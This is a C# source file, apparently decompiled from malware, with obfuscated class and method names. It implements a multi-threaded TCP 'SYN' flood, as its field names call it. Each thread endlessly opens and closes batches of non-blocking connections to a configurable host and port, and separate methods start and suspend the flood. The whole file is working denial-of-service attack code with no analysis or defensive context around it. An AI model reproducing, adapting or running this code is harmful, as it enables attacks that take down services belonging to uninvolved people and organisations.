using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ns0;

internal class Class9
{
	private class Class10
	{
		private IPEndPoint IPEo;

		private Socket[] pSocket;

		private int iSSockets;

		public Class10(IPEndPoint ipendPoint_0, int int_0)
		{
			IPEo = ipendPoint_0;
			iSSockets = int_0;
		}

		private void method_0(IAsyncResult iasyncResult_0)
		{
		}

		public void method_1()
		{
			while (true)
			{
				try
				{
					while (true)
					{
						pSocket = new Socket[iSSockets];
						for (int i = 0; i < iSSockets; i++)
						{
							pSocket[i] = new Socket(IPEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
							pSocket[i].Blocking = false;
							AsyncCallback callback = method_0;
							pSocket[i].BeginConnect(IPEo, callback, pSocket[i]);
						}
						Thread.Sleep(100);
						for (int i = 0; i < iSSockets; i++)
						{
							if (pSocket[i].Connected)
							{
								pSocket[i].Disconnect(reuseSocket: false);
							}
							pSocket[i].Close();
							pSocket[i] = null;
						}
						pSocket = null;
					}
				}
				catch
				{
					for (int i = 0; i < iSSockets; i++)
					{
						try
						{
							if (pSocket[i].Connected)
							{
								pSocket[i].Disconnect(reuseSocket: false);
							}
							pSocket[i].Close();
							pSocket[i] = null;
						}
						catch
						{
						}
					}
				}
			}
		}
	}

	private static ThreadStart[] tFloodingJob;

	private static Thread[] tFloodingThread;

	public static string sFHost;

	private static IPEndPoint IPEo;

	public static ushort uPort;

	private static Class10[] SYNClass;

	public static int iSSockets;

	public static int iThreads;

	public static void smethod_0()
	{
		try
		{
			IPEo = new IPEndPoint(Dns.GetHostEntry(sFHost).AddressList[0], uPort);
		}
		catch
		{
			IPEo = new IPEndPoint(IPAddress.Parse(sFHost), uPort);
		}
		tFloodingThread = new Thread[iThreads];
		tFloodingJob = new ThreadStart[iThreads];
		SYNClass = new Class10[iThreads];
		for (int i = 0; i < iThreads; i++)
		{
			SYNClass[i] = new Class10(IPEo, iSSockets);
			tFloodingJob[i] = SYNClass[i].method_1;
			tFloodingThread[i] = new Thread(tFloodingJob[i]);
			tFloodingThread[i].Start();
		}
	}

	public static void smethod_1()
	{
		for (int i = 0; i < iThreads; i++)
		{
			try
			{
				tFloodingThread[i].Suspend();
			}
			catch
			{
			}
		}
	}
}
